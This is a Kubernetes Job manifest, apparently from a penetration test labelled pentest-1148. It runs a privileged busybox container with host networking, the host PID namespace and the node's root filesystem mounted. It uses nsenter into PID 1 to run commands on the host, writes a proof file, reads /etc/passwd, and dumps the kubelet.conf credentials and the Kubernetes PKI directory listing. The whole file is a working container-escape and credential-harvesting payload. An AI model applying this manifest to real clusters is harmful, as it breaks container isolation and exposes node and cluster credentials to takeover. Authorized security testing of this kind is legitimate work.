apiVersion: batch/v1
kind: Job
metadata:
  name: hostexec2
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      hostNetwork: true
      hostPID: true
      containers:
      - name: c
        image: busybox:1.36
        securityContext:
          privileged: true
        volumeMounts:
        - name: hostroot
          mountPath: /host
        command: ["/bin/sh","-c"]
        args:
        - |
          {
            echo "## nsenter-host-exec"
            nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'id; hostname; cat /etc/hostname; printf p1148-proof > /tmp/p1148_probe; ls -la /tmp/p1148_probe; head -3 /etc/passwd; ps -ef | head -10' 2>&1
            echo "## kubelet-conf"
            cat /host/etc/kubernetes/kubelet.conf 2>&1 | head -60
            echo "## host-pki"
            ls -la /host/etc/kubernetes/pki 2>&1 | head -40
            echo "## host-etc-kubernetes"
            ls -la /host/etc/kubernetes 2>&1 | head -30
            echo "## host-node-ip"
            cat /host/etc/hosts 2>&1 | head -10
          } 2>&1
      volumes:
      - name: hostroot
        hostPath:
          path: /
